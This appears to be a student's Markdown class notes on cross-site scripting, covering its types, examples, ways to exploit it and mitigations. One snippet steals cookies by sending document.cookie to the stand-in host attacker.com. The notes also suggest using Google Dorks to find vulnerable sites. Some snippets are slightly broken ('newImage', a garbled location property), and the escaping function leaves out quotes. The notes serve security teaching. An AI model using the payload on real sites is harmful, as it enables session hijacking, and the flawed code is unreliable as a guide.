- web security vulnerability that allows an attacker to inject malicious scripts into trusted websites
- Type of injection
- exploits trust b/w browser and server
# Why Does XSS Happen?
- Lack of input validation and output sanitization
	- i.e. if we are expecting an integer, don't trust that user will always enter an integer, must validate it first
- Dynamic generation of HTML content without proper safeguards
	- i.e. php
- Trust in user input as "safe"
	- NEVER TRUST THE USERS
	- even if it is an internal tool or something that's not widely used, if there's **anything** sensitive then you can't trust the users.
# Types of XSS

| Type          | Desc                                                                   | Notes                                                                                                                                                                                                                                                |
| ------------- | ---------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Stored XSS    | Malicious payload is **stored** on the server (e.g. in a database)     | This is the worst type because it persists. An attacker can get their malicious script in your database so that you serve it from your website. Affects everyone that visits your website                                                            |
| Reflected XSS | Malicious payload is **reflected** off a web application to the victim | Your website is not storing the script, but you have a url that is not authenticated. Your website is basically a trampoline to the malicious script. Less impactful since only that specific url is the malicious one, other users aren't affected. |
| DOM-Based XSS | Vulnerability exists in the **client-side** script                     | Hardest to find, exploit, but most valuable from bounty. Don't exploit the website, exploit the user accessing the website. No other details given in class                                                                                          |

# Examples
- Stored XSS
	- A comment field on a blog allows users to post messages
	- An attacker submits the comment `<script> alert('XSS!'); </script>`
	- The script is stored in the database and executed by every user who views the comment
		- **note**: whenever we actually have something malicious in the script tag, `alert` is the common benign one to show that it's vulnerable
- Reflected XSS
	- A search form dynamically displays user input in the response
	- The attacker crafts a malicious url
	- The malicious script is reflected in the server's response
		- `http://example.com/search?q=<script>alert('XSS')</script>`
- DOM-Based XSS
	- Vulnerability exists in client side javascript
	- i.e. in client side javascript

```js
var query = window.location.\$search;
document.getElementById('output').innerHTML = query;
```

- attacker provides `http://example.com?<script>alert('XSS')</script>`
- The script is executed by the browser
- If this client side is part of a framework i.e. wordpress then you can find these vulnerable websites by using [[Google Dorks]] to find websites built with that framework.

# How to Exploit
- **Stealing cookies** - Access session cookies to hijack user sessions
- **Keylogging** - Inject scripts to log user keystrokes
- **Phishing** - Redirect users to malicious sites
- **Defacement** - Modify website content to mislead users

# Cookie Theft Example
- Inject script
```html
<script>
var img = newImage();
img.src = 'http://attacker.com/cookie=' + document.cookie;
</script>
```
- cookies are sent to attacker.com
# Mitigation
- Practices
	- **Input Validation**: Validate all user inputs on both client and server
	- **Output Encoding**: Encode outputs to prevent script execution
		- i.e. don't output raw data and don't ingest raw data from users
- Technology/Configuration
	- **Content Securitiy Policy (CSP)**: Restrict sources of executable scripts
	- **Use HTTP-Only Cookies**: Prevent access to cookies via javascript
# Mitigation Example: Output Encoding
- Use functions to encode user input before rendering
```html
<p>$escapeHtml(userInput)</p>
```

```javascript
function escapeHtml(input) {
	return input.replace(/\&/g, '\&amp;')
				.replace(/</g, '\&lt;')
				.replace(/>/g, '\&gt;');
}
```

#OWASP #Injection